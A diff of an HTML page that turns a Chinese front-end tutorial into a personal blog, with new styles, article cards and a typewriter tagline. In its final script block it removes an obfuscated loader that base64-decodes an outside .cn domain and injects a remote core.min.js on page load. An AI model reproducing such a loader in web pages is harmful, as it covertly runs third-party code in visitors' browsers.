@@ -3,352 +3,356 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>现代前端开发指南 - 暗黑模式</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>思维流：数字画布</title>
     <style>
-        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
-            font-family: 'Consolas', 'Monaco', monospace;
-            /* 代码友好字体 */
+            font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #1a1a2e;
-            /* 深蓝紫色背景 */
-            color: #e0e0e0;
-            /* 浅灰色文本 */
-            line-height: 1.6;
+            background-color: #1E2A38;
+            color: #E0E6ED;
+            line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
         }
 
-        /* 容器 */
         .container {
             max-width: 90%;
-            /* 适应移动端 */
             margin: 0 auto;
-            padding: 20px 0;
+            padding: 30px 0;
         }
 
-        /* 头部 - 简约深色风格 */
         header {
-            background-color: #0f0f1b;
-            /* 更深的头部背景 */
-            padding: 30px 20px;
+            background-color: #1E2A38;
+            padding: 60px 20px;
             text-align: center;
-            border-bottom: 2px solid #2e2e4a;
-            /* 强调色边框 */
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
-            /* 明显阴影 */
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            border-bottom: 5px solid #FF6F61;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: -50px;
+            left: -50px;
+            width: 250px;
+            height: 250px;
+            background: #F0E68C;
+            border-radius: 60% 40% 30% 70% / 60% 30% 70% 40%;
+            transform: rotate(30deg);
+            opacity: 0.15;
+            z-index: 0;
+        }
+
+        header::after {
+            content: '';
+            position: absolute;
+            bottom: -70px;
+            right: -70px;
+            width: 350px;
+            height: 350px;
+            background: #FF6F61;
+            border-radius: 40% 60% 60% 40% / 40% 40% 60% 60%;
+            transform: rotate(-50deg);
+            opacity: 0.1;
+            z-index: 0;
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Segoe UI', sans-serif;
-            /* 现代无衬线字体 */
-            font-size: 2.4em;
-            /* 更大标题 */
-            color: #00bcd4;
-            /* 强调色：青绿色 */
-            letter-spacing: 1px;
-            text-shadow: 0 0 8px rgba(0, 188, 212, 0.5);
-            /* 光晕效果 */
+            font-family: 'Montserrat', sans-serif;
+            font-size: 3.5em;
+            color: #FF6F61;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            text-shadow: 0 0 20px rgba(255, 111, 97, 0.6);
+            position: relative;
+            z-index: 1;
         }
 
-        header p {
-            font-size: 1.1em;
-            color: #b0b0b0;
-            /* 柔和浅灰色 */
-            margin-top: 10px;
+        #tagline {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.4em;
+            color: #F0E68C;
+            margin-top: 15px;
+            position: relative;
+            z-index: 1;
+            min-height: 1.4em;
+            display: inline-block;
         }
 
-        /* 导航菜单 - 标签式横向菜单 */
         nav {
-            background-color: #2e2e4a;
-            /* 导航背景色 */
-            text-align: center;
-            padding: 10px 0;
+            background-color: #2C3E50;
+            padding: 15px 0;
+            margin-top: 40px;
             border-radius: 10px;
-            /* 柔和圆角 */
-            margin-top: 25px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
             position: sticky;
-            /* 粘性定位 */
-            top: 0;
-            /* 粘在顶部 */
+            top: 20px;
             z-index: 1000;
-            /* 确保在最上层 */
+            width: 90%;
+            /* Adjusted width for better mobile fit */
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+            /* Removed display: flex from nav itself */
         }
 
         nav ul {
             list-style: none;
-            padding: 0;
+            padding: 0 10px;
+            /* Added horizontal padding */
             margin: 0;
             display: flex;
-            justify-content: space-around;
+            justify-content: center;
+            /* Centered items when wrapped */
             flex-wrap: wrap;
+            /* Allow items to wrap */
+            gap: 10px;
+            /* Consistent spacing between items */
         }
 
         nav ul li {
-            margin: 5px;
+            /* Margin handled by gap now */
         }
 
         nav ul li a {
-            background-color: #3f3f60;
-            /* 标签背景色 */
-            color: #ffffff;
-            /* 白色文字 */
+            background-color: transparent;
+            color: #E0E6ED;
             text-decoration: none;
-            padding: 10px 18px;
-            /* 标签内边距 */
+            padding: 10px 20px;
+            /* Slightly adjusted padding for better fit */
             border-radius: 8px;
-            /* 标签圆角 */
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            border: 2px solid #AAB8C2;
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease, border-color 0.3s ease;
             display: inline-block;
-            font-weight: 600;
-            font-size: 0.95em;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            font-weight: bold;
+            font-size: 1em;
+            text-transform: uppercase;
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #00bcd4;
-            /* 强调色悬停 */
-            color: #1a1a2e;
-            /* 悬停时深色文字 */
-            transform: translateY(-3px);
-            box-shadow: 0 4px 8px rgba(0, 188, 212, 0.4);
-            /* 强调色阴影 */
+            background-color: #FF6F61;
+            color: #1E2A38;
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.4);
+            border-color: #FF6F61;
         }
 
-        /* 内容区 - 深色卡片风格 */
         main {
-            padding-top: 20px;
+            padding-top: 40px;
         }
 
-        section {
-            background-color: #2e2e4a;
-            /* 内容区背景色 */
-            margin-bottom: 25px;
-            padding: 25px;
-            border-radius: 12px;
-            /* 柔和圆角 */
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
-            /* 明显阴影 */
+        .article-card {
+            background-color: #2C3E50;
+            margin-bottom: 50px;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            border-left: 8px solid #F0E68C;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        section h2 {
-            font-family: 'Segoe UI', sans-serif;
-            font-size: 1.8em;
-            color: #00bcd4;
-            /* 强调色 */
+        .article-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+        }
+
+        .article-card::before {
+            content: '';
+            position: absolute;
+            top: -20px;
+            right: -20px;
+            width: 100px;
+            height: 100px;
+            background: #FF6F61;
+            border-radius: 30% 70% 50% 50% / 50% 50% 70% 30%;
+            opacity: 0.08;
+            transform: rotate(15deg);
+            z-index: 0;
+        }
+
+        .article-card h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.5em;
+            color: #FF6F61;
             margin-top: 0;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #3f3f60;
-            /* 细分隔线 */
+            margin-bottom: 20px;
+            border-bottom: 1px dashed #AAB8C2;
             padding-bottom: 10px;
+            position: relative;
+            z-index: 1;
         }
 
-        section h3 {
-            font-family: 'Segoe UI', sans-serif;
-            font-size: 1.3em;
-            color: #e0e0e0;
-            margin-top: 20px;
-            margin-bottom: 10px;
+        .article-card .date {
+            font-size: 1em;
+            color: #AAB8C2;
+            margin-bottom: 25px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            z-index: 1;
         }
 
-        section p {
-            font-size: 0.95em;
-            color: #c0c0c0;
-            margin-bottom: 15px;
+        .article-card p {
+            font-size: 1.1em;
+            color: #E0E6ED;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
         }
 
-        section img {
+        .article-card img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 15px auto;
-            border-radius: 8px;
-            /* 图片圆角 */
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-
-        /* 代码块样式 - 突出显示 */
-        pre {
-            background-color: #0f0f1b;
-            /* 更深的背景色 */
-            color: #00bcd4;
-            /* 代码强调色 */
-            padding: 18px;
+            margin: 30px auto;
             border-radius: 10px;
-            overflow-x: auto;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 0.9em;
-            margin-bottom: 20px;
-            border: 1px solid #3f3f60;
-            /* 边框 */
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+            border: 3px solid #F0E68C;
+            position: relative;
+            z-index: 1;
         }
 
-        code {
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 0.9em;
-            color: #00bcd4;
-            /* 代码中的强调色 */
-        }
-
-        pre code {
-            color: #b3e5fc;
-            /* 代码块内的代码颜色 */
-        }
-
-        /* 页脚 - 简洁深色风格 */
-        footer {
-            background-color: #0f0f1b;
-            /* 页脚背景色 */
-            padding: 25px 0;
-            text-align: center;
-            font-size: 0.9em;
-            color: #b0b0b0;
-            margin-top: 30px;
-            border-top: 2px solid #2e2e4a;
-            /* 强调色边框 */
-            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.3);
-        }
-
-        .footer-links a {
-            color: #00bcd4;
-            /* 强调色链接 */
+        .read-more {
+            display: inline-block;
+            background-color: #FF6F61;
+            color: #FFFFFF;
+            padding: 15px 35px;
+            border-radius: 50px;
             text-decoration: none;
-            margin: 0 15px;
+            font-weight: bold;
             font-size: 1.1em;
-            transition: color 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 111, 97, 0.3);
+            border: none;
+            position: relative;
+            z-index: 1;
         }
 
-        .footer-links a:hover {
-            color: #84ffff;
-            /* 悬停亮色 */
+        .read-more:hover {
+            background-color: #E65C5C;
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.5);
+        }
+
+        footer {
+            background-color: #1E2A38;
+            color: #AAB8C2;
+            padding: 50px 0;
+            text-align: center;
+            font-size: 0.95em;
+            margin-top: 60px;
+            border-top: 5px solid #F0E68C;
+            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        footer::before {
+            content: '';
+            position: absolute;
+            bottom: -50px;
+            left: -50px;
+            width: 200px;
+            height: 200px;
+            background: #FF6F61;
+            border-radius: 70% 30% 60% 40% / 30% 70% 40% 60%;
+            transform: rotate(40deg);
+            opacity: 0.08;
+            z-index: 0;
+        }
+
+        .social-links a {
+            color: #E0E6ED;
+            text-decoration: none;
+            margin: 0 20px;
+            font-size: 1.8em;
+            transition: color 0.3s ease, transform 0.2s ease;
+            position: relative;
+            z-index: 1;
+        }
+
+        .social-links a:hover {
+            color: #F0E68C;
+            transform: translateY(-5px) scale(1.1);
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <header>
         <div class="container">
-            <h1>现代前端开发指南</h1>
-            <p>掌握最新技术，构建高性能Web应用</p>
+            <h1>思维流</h1>
+            <p id="tagline"></p>
         </div>
     </header>
 
     <div class="container">
         <nav id="mainNav">
             <ul>
-                <li><a href="#intro">引言</a></li>
-                <li><a href="#react">React框架</a></li>
-                <li><a href="#webpack">Webpack打包</a></li>
-                <li><a href="#testing">测试实践</a></li>
+                <li><a href="#latest-thoughts">最新思想</a></li>
+                <li><a href="#creative-works">创意作品</a></li>
+                <li><a href="#about-me">关于我</a></li>
+                <li><a href="#contact">联系</a></li>
             </ul>
         </nav>
 
         <main>
-            <section id="intro">
-                <h2>引言：前端技术栈演进</h2>
-                <img src="https://picsum.photos/300/200?random=1&v=abc123xyz" alt="前端技术栈" class="random-image">
-                <p>前端开发领域正以惊人的速度发展，新的框架、工具和模式层出不穷。本指南旨在为您梳理现代前端开发的核心概念和最佳实践，帮助您紧跟技术潮流，构建健壮且高效的应用。</p>
-                <p>我们将从基础概念出发，逐步深入到流行的框架、构建工具和测试策略，确保您能全面掌握现代前端开发的精髓。</p>
-            </section>
+            <section id="latest-thoughts">
+                <h2>最新思想</h2>
+                <div class="article-list">
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=1&seed=abstract-thought-01" alt="抽象思考"
+                            class="random-image">
+                        <h2>意识的边界：探索数字与现实的交织</h2>
+                        <span class="date">2025年07月29日</span>
+                        <p>在数字信息无处不在的今天，我们如何定义“现实”？本文将探讨意识、技术与感官体验之间的复杂关系。</p>
+                        <a href="#" class="read-more">深入思考</a>
+                    </div>
 
-            <section id="react">
-                <h2>React框架：组件化与状态管理</h2>
-                <img src="https://picsum.photos/300/200?random=2&id=def456uvw" alt="React组件" class="random-image">
-                <p>React 是一个用于构建用户界面的 JavaScript 库。其核心思想是组件化，通过将UI拆分成独立、可复用的组件来简化开发。以下是一个简单的 React 函数组件示例：</p>
-                <pre><code>import React, { useState }s;
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=2&seed=geometric-patterns-02" alt="几何图案"
+                            class="random-image">
+                        <h2>几何之美：代码中的秩序与混沌</h2>
+                        <span class="date">2025年07月25日</span>
+                        <p>代码是逻辑的艺术，而几何图形则是其视觉表达。本文将展示如何在编程中创造出令人惊叹的几何美学。</p>
+                        <a href="#" class="read-more">探索几何</a>
+                    </div>
 
-function Counter() {
-  const [count, setCount] = useState(0);
-
-  return (
-    &lt;div&gt;
-      &lt;p&gt;当前计数: {count}&lt;/p&gt;
-      &lt;button onClick={() => setCount(count + 1)}&gt;增加&lt;/button&gt;
-    &lt;/div&gt;
-  );
-}
-
-export default Counter;</code></pre>
-                <p>通过 `useState` Hook，我们可以在函数组件中管理状态，实现交互性。</p>
-            </section>
-
-            <section id="webpack">
-                <h2>Webpack打包：模块化与优化</h2>
-                <img src="https://picsum.photos/300/200?random=3&key=ghj789klm" alt="Webpack图标" class="random-image">
-                <p>Webpack 是一个强大的模块打包器，它能够将前端项目中的各种资源（如 JavaScript、CSS、图片等）打包成浏览器可识别的静态文件。以下是一个简单的 Webpack 配置示例：</p>
-                <pre><code>// webpack.config.js
-const path = require('path');
-
-module.exports = {
-  mode: 'development', // 或 'production'
-  entry: './src/index.js', // 入口文件
-  output: {
-    filename: 'bundle.js', // 输出文件名
-    path: path.resolve(__dirname, 'dist'), // 输出目录
-  },
-  module: {
-    rules: [
-      {
-        test: /\.js$/, // 匹配JS文件
-        exclude: /node_modules/,
-        use: {
-          loader: 'babel-loader', // 使用Babel处理JS
-          options: {
-            presets: ['@babel/preset-env', '@babel/preset-react'],
-          },
-        },
-      },
-      {
-        test: /\.css$/, // 匹配CSS文件
-        use: ['style-loader', 'css-loader'], // 处理CSS
-      },
-    ],
-  },
-};</code></pre>
-                <p>Webpack 的强大之处在于其可扩展性，通过各种 Loader 和 Plugin 可以实现复杂的构建流程优化。</p>
-            </section>
-
-            <section id="testing">
-                <h2>测试实践：保障代码质量</h2>
-                <img src="https://picsum.photos/300/200?random=4&token=nop012qrs" alt="测试代码" class="random-image">
-                <p>编写高质量的代码离不开完善的测试。前端测试通常包括单元测试、集成测试和端到端测试。Jest 和 React Testing Library 是 React 应用中常用的测试工具。</p>
-                <pre><code>// counter.test.js
-import { render, fireEvent, screen } from '@testing-library/react';
-import Counter from './Counter';
-
-test('计数器能够正确增加', () => {
-  render(&lt;Counter /&gt;);
-  const countElement = screen.getByText(/当前计数/i);
-  const buttonElement = screen.getByText(/增加/i);
-
-  expect(countElement).toHaveTextContent('当前计数: 0');
-
-  fireEvent.click(buttonElement); // 模拟点击
-  expect(countElement).toHaveTextContent('当前计数: 1');
-
-  fireEvent.click(buttonElement);
-  expect(countElement).toHaveTextContent('当前计数: 2');
-});</code></pre>
-                <p>通过编写测试用例，我们可以确保代码的稳定性和可靠性，减少潜在的bug。</p>
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=3&seed=fluid-motion-03" alt="流体运动"
+                            class="random-image">
+                        <h2>流体设计：用户体验的无缝流动</h2>
+                        <span class="date">2025年07月18日</span>
+                        <p>一个优秀的用户界面，其设计应像流体般自然。本文将解析如何通过动画和交互，实现无缝的用户体验。</p>
+                        <a href="#" class="read-more">体验流动</a>
+                    </div>
+                </div>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 前端指南. 版权所有.</p>
-            <div class="footer-links">
-                <a href="#" target="_blank">GitHub</a> |
-                <a href="#" target="_blank">联系我们</a> |
-                <a href="#" target="_blank">关于</a>
+            <p>&copy; 2025 思维流. 数字版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">🔗</a> |
+                <a href="#" target="_blank">✨</a> |
+                <a href="#" target="_blank">💡</a>
             </div>
         </div>
     </footer>
@@ -366,18 +370,57 @@ test('计数器能够正确增加', () => {
         document.addEventListener('DOMContentLoaded', function () {
             document.querySelectorAll('nav a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
-                    e.preventDefault(); // 阻止默认跳转
+                    e.preventDefault();
+
                     const targetId = this.getAttribute('href').substring(1);
                     const targetElement = document.getElementById(targetId);
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop,
-                            behavior: 'smooth' // 平滑滚动
+                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20,
+                            behavior: 'smooth'
                         });
                     }
                 });
             });
+
+            const taglineElement = document.getElementById('tagline');
+            const taglines = [
+                "捕捉灵感瞬间",
+                "探索未知领域",
+                "构建数字世界",
+                "分享独特视角"
+            ];
+            let taglineIndex = 0;
+            let charIndex = 0;
+            let isDeleting = false;
+            let typingSpeed = 100;
+            let deletingSpeed = 50;
+            let delayBetweenTaglines = 1500;
+
+            function typeWriter() {
+                const currentTagline = taglines[taglineIndex];
+                if (isDeleting) {
+                    taglineElement.textContent = currentTagline.substring(0, charIndex--);
+                } else {
+                    taglineElement.textContent = currentTagline.substring(0, charIndex++);
+                }
+
+                let speed = isDeleting ? deletingSpeed : typingSpeed;
+
+                if (!isDeleting && charIndex === currentTagline.length + 1) {
+                    speed = delayBetweenTaglines;
+                    isDeleting = true;
+                } else if (isDeleting && charIndex === -1) {
+                    isDeleting = false;
+                    taglineIndex = (taglineIndex + 1) % taglines.length;
+                    speed = typingSpeed;
+                }
+
+                setTimeout(typeWriter, speed);
+            }
+
+            typeWriter();
         });
     </script>
     <script>
@@ -385,53 +428,15 @@ test('计数器能够正确增加', () => {
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9hNnM4ZDBmLmdwZ2dnbS5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
